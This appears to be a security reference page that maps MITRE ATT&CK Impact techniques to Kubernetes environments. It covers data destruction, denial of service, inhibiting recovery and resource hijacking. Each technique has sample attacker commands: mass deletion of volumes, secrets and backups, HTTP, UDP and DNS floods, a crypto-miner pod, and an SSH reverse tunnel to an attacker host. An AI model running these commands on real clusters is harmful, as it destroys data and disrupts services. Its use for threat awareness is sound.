# Impact

## **Impact Techniques in Containerized Environments**

In Kubernetes and containerized infrastructures, adversaries use Impact techniques to disrupt service availability, destroy critical data, exhaust resources, and hinder recovery efforts. These attacks can cripple containerized workloads, overwhelm clusters, and abuse cloud resources, often resulting in downtime, financial loss, or long-term degradation of service.

***

#### 🧨 Data Destruction → **T1485**

**Description**:\
Destroy or corrupt containerized data, application states, Kubernetes Secrets, or mounted storage volumes to impact the availability or integrity of services.

**Container Example**:\
After compromising a container, the attacker deletes mounted Persistent Volume Claims (PVCs):

```bash
bashCopyEditrm -rf /mnt/data/*
```

Or directly deletes Kubernetes Secrets and ConfigMaps:

```bash
bashCopyEditkubectl delete secrets --all --namespace production
```

If access to cloud storage is possible (e.g., Azure Disks, Azure Files), the attacker may format or unmount the volumes, causing irreversible data loss.

***

#### 🚫 Endpoint Denial of Service

**Description**:\
Flood containerized services, APIs, or applications hosted within Kubernetes to exhaust service capacity and render endpoints unavailable.

**Container Example**:\
The attacker launches an HTTP flood against a Kubernetes Ingress Controller, API endpoint, or exposed application service:

```bash
bashCopyEditwhile true; do curl http://target-service.default.svc.cluster.local; done
```

Or triggers excessive load against internal APIs to crash the service:

```bash
bashCopyEditab -n 1000000 -c 100 http://10.0.0.5:8080/
```

This attack can overwhelm Kubernetes nodes, exhaust Ingress Controller threads, or crash API servers under heavy load.

***

#### 🔁 Inhibit System Recovery

**Description**:\
Delete or disable backup resources (e.g., PVC snapshots, etcd backups, recovery scripts) to prevent restoration after sabotage or system failure.

**Container Example**:\
The attacker deletes backup volumes or tamper with recovery scripts:

```bash
bashCopyEditkubectl delete pvc --all --namespace backup
kubectl delete configmap recovery-scripts --namespace kube-system
```

In Azure, the attacker could revoke or delete Azure Backup vault resources if they have token access.

**Result**:\
Even if defenders detect the breach, recovery options are significantly limited, prolonging downtime.

***

#### 🌐 Network Denial of Service

**Description**:\
Flood Kubernetes network infrastructure, including CNI plugins, kube-proxy, services, or Ingress Controllers, to disrupt pod-to-pod or external communications.

**Container Example**:\
Flood Kubernetes internal network:

```bash
bashCopyEdithping3 --flood --udp -p 443 10.0.0.0/16
```

Or target the Kubernetes DNS (CoreDNS):

```bash
bashCopyEditwhile true; do dig @10.0.0.10 example.com; done
```

This disrupts service discovery (DNS outages) and inter-pod communication, cascading into application failures.

***

#### 🪙 Resource Hijacking → **Compute Hijacking (T1496.001)**

**Description**:\
Steal Kubernetes cluster compute resources (CPU, GPU) to run unauthorized workloads like cryptocurrency miners.

**Container Example**:\
The attacker deploys a hidden crypto-mining pod:

```bash
bashCopyEditkubectl run miner --image=evilcorp/xmrig --restart=Always --namespace default
```

Or compromises a Jenkins agent in the cluster to execute mining software covertly.

**Impact**:\
Exhausts node resources, degrades performance for legitimate workloads, and drives up cloud billing costs.

***

#### 📡 Resource Hijacking → **Bandwidth Hijacking (T1496.002)**

**Description**:\
Abuse container network bandwidth to host proxies, exfiltrate data, or route attacker traffic, consuming outbound bandwidth and possibly violating cloud service terms.

**Container Example**:\
The attacker deploys a TOR relay or SOCKS proxy inside a pod:

```bash
bashCopyEditdocker run -d --name tor-relay evilcorp/tor-node
```

Or sets up a hidden exfiltration tunnel:

```bash
bashCopyEditssh -R 0.0.0.0:2222:localhost:22 attacker@remote-server
```

**Impact**:\
Consumes egress bandwidth, increases cloud bills, risks legal exposure, and can trigger cloud provider throttling or account suspension.

***

### 📊 Summary Table

| Technique                       | Containerized Use Case                                       |
| ------------------------------- | ------------------------------------------------------------ |
| T1485 – Data Destruction        | Delete mounted PVCs, Kubernetes Secrets, or cloud storage    |
| Endpoint Denial of Service      | HTTP floods, application load exhaustion, API hammering      |
| Inhibit System Recovery         | Delete backups, PVC snapshots, recovery ConfigMaps           |
| Network Denial of Service       | Flood internal Kubernetes DNS, kube-proxy, or pod networking |
| T1496.001 – Compute Hijacking   | Deploy crypto miners or abuse CI/CD containers               |
| T1496.002 – Bandwidth Hijacking | Deploy TOR relays, proxies, or exfil tunnels from pods       |
